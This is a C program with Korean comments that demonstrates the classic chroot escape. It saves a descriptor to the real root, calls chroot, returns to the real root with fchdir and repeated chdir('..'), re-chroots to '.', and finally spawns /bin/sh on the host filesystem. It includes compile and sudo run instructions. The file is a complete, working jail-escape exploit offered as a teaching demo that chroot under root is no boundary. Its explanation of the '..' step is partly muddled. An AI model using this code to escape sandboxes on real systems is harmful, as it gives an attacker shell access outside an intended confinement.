/*
 * chroot_escape.c
 *
 * chroot()가 "격리"가 아니라 "경로 재해석"에 불과하다는 것을 보여주는 고전적 데모.
 *
 * 원리:
 *   1. chroot() 하기 전에, 진짜 root 디렉토리("/")를 가리키는 파일 디스크립터를 미리 열어둔다.
 *   2. chroot("/some/fake/root") 를 호출한다.
 *      -> 이 시점부터 프로세스가 보는 "/"는 /some/fake/root 로 재해석된다.
 *      -> 하지만 커널 내부적으로 실제 파일시스템 구조나 마운트 네임스페이스는 전혀 바뀌지 않았다.
 *   3. 아까 열어둔 진짜 root fd로 fchdir() 해서 실제 root 디렉토리로 현재 작업 디렉토리를 이동시킨다.
 *      -> chroot는 "apparent root"만 바꿨을 뿐, cwd가 실제 루트 밖으로 나가는 것 자체는 막지 않는다.
 *   4. chdir("..") 를 반복해서 "/" 밖으로 상위 디렉토리를 계속 타고 올라간다.
 *      -> chroot된 상태의 "/"는 이미 실제 root이므로, ".."을 반복해도 커널은
 *         더 이상 올라갈 필요가 없다고 판단하고 실제로는 아무 데도 못 가지만,
 *         이미 3번에서 cwd 자체가 진짜 root였기 때문에 문제없이 시스템 전체를 탐색 가능해진다.
 *
 * 전제조건: root 권한 (CAP_SYS_CHROOT)이 있어야 chroot()가 성공한다.
 *          -> 이게 핵심 포인트: "root 권한이 있는 상태의 chroot는 보안 경계가 아니다."
 *
 * 컴파일: gcc -o chroot_escape chroot_escape.c
 * 실행:   sudo ./chroot_escape /path/to/fake/root
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>

#define UP_LIMIT 256  // ".." 반복 횟수 (충분히 크게)

static void die(const char *msg) {
    fprintf(stderr, "[!] %s: %s\n", msg, strerror(errno));
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "사용법: %s <가짜 root로 쓸 디렉토리 경로>\n", argv[0]);
        fprintf(stderr, "예:     %s /tmp/fakeroot\n", argv[0]);
        return 1;
    }

    const char *fake_root = argv[1];

    // 가짜 root 디렉토리가 없으면 만들어준다
    if (mkdir(fake_root, 0755) != 0 && errno != EEXIST) {
        die("mkdir 실패");
    }

    printf("[*] 1단계: chroot 이전에 진짜 root(\"/\") 디렉토리 fd를 미리 확보\n");
    int real_root_fd = open("/", O_RDONLY | O_DIRECTORY);
    if (real_root_fd < 0) {
        die("진짜 root open 실패");
    }
    printf("    -> real_root_fd = %d (이 fd는 chroot 이후에도 여전히 진짜 '/'를 가리킴)\n", real_root_fd);

    printf("[*] 2단계: chroot(\"%s\") 호출 -> 이제 프로세스가 보는 '/'는 %s\n", fake_root, fake_root);
    if (chroot(fake_root) != 0) {
        die("chroot 실패 (root 권한으로 실행했는지 확인: sudo ./chroot_escape ...)");
    }

    printf("[*] 3단계: 미리 확보해둔 real_root_fd로 fchdir() -> cwd를 진짜 root로 이동\n");
    if (fchdir(real_root_fd) != 0) {
        die("fchdir 실패");
    }
    close(real_root_fd);

    printf("[*] 4단계: chdir(\"..\") 를 %d번 반복 -> chroot 경계를 무의미하게 만듦\n", UP_LIMIT);
    for (int i = 0; i < UP_LIMIT; i++) {
        if (chdir("..") != 0) {
            die("chdir('..') 실패");
        }
    }

    printf("[*] 5단계: chroot(\".\") 호출 -> apparent root를 현재 cwd(=진짜 root)로 재설정\n");
    if (chroot(".") != 0) {
        die("chroot('.') 실패");
    }

    printf("\n[+] 탈출 성공. 이제 이 프로세스는 다시 실제 호스트 파일시스템 전체를 볼 수 있음.\n");
    printf("[+] 증거로 실제 root 디렉토리 목록을 출력합니다:\n\n");

    // 탈출 성공 여부를 눈으로 확인하기 위해 execve로 셸을 실행
    // -> 이 셸에서 ls / 등을 쳐보면 fake_root가 아니라 진짜 호스트 root가 보임
    char *shell_argv[] = {"/bin/sh", NULL};
    execv("/bin/sh", shell_argv);

    // execv가 실패한 경우에만 여기 도달
    die("execv 실패");
    return 1;
}
